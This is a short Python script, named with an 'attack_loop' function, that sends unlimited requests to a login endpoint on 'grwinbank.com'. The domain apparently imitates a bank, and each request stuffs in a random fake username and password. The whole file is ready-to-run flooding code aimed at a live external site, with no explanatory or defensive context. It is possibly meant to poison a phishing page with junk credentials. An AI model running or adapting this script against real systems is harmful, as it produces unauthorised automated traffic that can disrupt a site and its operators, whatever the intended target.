import requests
import os
import string
from itertools import product
from time import time
import random
counter = 0

def attack_loop():
    global counter
    counter += 1
    print("Try: ", counter)
    u = str(''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(random.randint(5,15))))
    p = str(''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(random.randint(5,15))))
    url  = 'https://grwinbank.com/home.php'
    url += '?pl=token'
    url += '&link=winbank'
    url += '&bid=39f9ddc74c5967fb87d29f2b1d4b4941'
    url += '&callback=jQuery32108830796702018304_1626605315246'
    url += '&data={\"prev_op\":\"ask_login\",\"keys\":{\"Username\":\"'
    url += u
    url += '\",\"Password\":\"'
    url += p
    url += '\"}}and_=1626605315321'
    response = requests.get(url)
    print('Username: ',u,'\nPassword: ',p)
    print('response: ', response.text)
    print('status code: ' ,response.status_code)
    if response.status_code != 200:
        exit()
    return False

while True:
    attack_loop()





